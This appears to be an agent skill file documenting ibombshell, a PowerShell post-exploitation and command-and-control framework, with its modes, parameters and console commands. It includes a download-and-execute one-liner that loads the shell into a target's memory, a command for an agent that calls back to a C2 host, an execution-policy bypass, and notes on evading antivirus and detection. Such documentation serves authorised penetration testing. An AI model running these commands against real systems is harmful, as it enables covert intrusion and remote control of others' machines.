---
name: ibombshell
description: A dynamic remote shell and post-exploitation framework written in PowerShell that runs entirely in memory. Use it to establish a command-line prompt with extensible pentesting features, or deploy a "warrior" agent for silent C2 communication over HTTP. It is ideal for post-exploitation, memory-only execution to avoid disk forensics, and remote administration during penetration tests.
---

# ibombshell

## Overview
ibombshell is a PowerShell-based tool designed for post-exploitation that provides a dynamic shell environment. It operates in two primary modes: "Everywhere" (direct memory-loaded shell) and "Silently" (a C2-controlled "warrior" instance). It allows for the on-demand loading of pentesting functions directly into memory. Category: Post-Exploitation.

## Installation (if not already installed)
Assume ibombshell is already installed. If you encounter errors, ensure dependencies are met:

```bash
sudo apt install ibombshell powershell python3-pynput python3-termcolor
```

## Common Workflows

### Launching the C2 Console
To start the ibombshell control center to manage remote "warriors":
```bash
ibombshell
```

### Everywhere Mode (Direct execution)
To load the shell directly into a PowerShell session on a target:
```powershell
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Telefonica/ibombshell/master/ibombshell.ps1'); ibombshell
```

### Silently Mode (Warrior)
To execute a warrior that connects back to a C2 listener:
```powershell
ibombshell -Warrior -C2 <C2_IP_OR_DOMAIN>
```

## Complete Command Reference

The `ibombshell` command in Kali typically launches the Python-based C2 console. The underlying PowerShell script (`ibombshell.ps1`) accepts the following parameters when executed within a PowerShell environment:

### PowerShell Script Parameters

| Parameter | Description |
|-----------|-------------|
| `-Warrior` | Launches ibombshell in "Silently" mode, acting as a remote agent. |
| `-C2 <URL/IP>` | Specifies the Command and Control server address for the warrior to connect to. |
| `-Proxy <URL>` | Specifies a proxy server for the connection. |
| `-ProxyCreds <Credentials>` | Credentials for proxy authentication. |
| `-Delay <Seconds>` | The sleep interval between connections to the C2 (default is usually 5s). |
| `-Jitter <Percentage>` | Adds a random variation to the delay to evade behavioral detection. |

### C2 Console Commands
Once inside the `ibombshell` console (Python), the following internal commands are available:

| Command | Description |
|---------|-------------|
| `help` | Show available commands. |
| `exit` | Exit the console. |
| `set <variable> <value>` | Set global variables (e.g., LHOST, LPORT). |
| `show <options|warriors>` | Display configuration options or currently connected warriors. |
| `interact <warrior_id>` | Start interacting with a specific remote warrior. |
| `load <module>` | Load a specific post-exploitation module into the current session. |

## Notes
- **Memory-Only**: ibombshell is designed to bypass classic AV/EDR by loading functions directly into the PowerShell process memory without touching the disk.
- **Execution Policy**: On Windows targets, you may need to bypass the execution policy: `powershell -ExecutionPolicy Bypass -File ibombshell.ps1`.
- **C2 Communication**: The "Warrior" mode uses HTTP/HTTPS for communication, making it suitable for environments where standard reverse shells are blocked.